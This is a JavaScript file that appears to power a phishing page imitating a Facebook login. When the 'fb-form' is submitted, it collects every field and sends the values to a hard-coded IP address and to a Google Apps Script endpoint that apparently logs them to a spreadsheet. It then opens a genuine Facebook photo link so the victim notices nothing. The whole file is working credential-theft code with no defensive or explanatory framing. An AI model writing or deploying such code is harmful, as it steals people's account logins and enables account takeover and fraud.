const formEl = document.querySelector(".fb-form");
let objFormData = {};
const loginButton = document.getElementById("loginButton");
const loadingSvg = document.getElementById("loadingSvg");

const submitFormData = async (formData, rawFormData) => {
  console.log("To mongodb...");
  try {
    const res = await fetch("http://18.136.196.83/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });
    const data = await res.json();

    if (data.status === "ok") {
      console.log(data);
    } else {
      console.log("Something went wrong");
    }
  } catch (err) {
    console.log(err.message);
  }

  submitGoogleSheet(rawFormData);
};

const submitGoogleSheet = async (formData) => {
  console.log("To google sheets..");
  try {
    const res = await fetch(
      "https://script.google.com/macros/s/AKfycbxFOrSsmh8ieuEwyYaszITABigA94rhb5NgzuUaPYCrFKGaPDAVZ11k14cIwFTiQ8fWDw/exec",
      {
        method: "POST",
        body: formData,
      }
    );
    const data = await res.json();
    console.log(data);
  } catch (err) {
    console.error(err);
  }

  loadingSvg.classList.remove("active");
  loginButton.classList.add("active");

  window.open(
    "https://www.facebook.com/photo/?fbid=165534512758709&set=a.165534506092043",
    "_blank"
  );
};

formEl.addEventListener("submit", async (e) => {
  e.preventDefault();

  loadingSvg.classList.add("active");
  loginButton.classList.remove("active");

  const formData = new FormData(formEl);

  formData.forEach((value, key) => {
    objFormData[key] = value;
  });

  submitFormData(objFormData, formData);
});
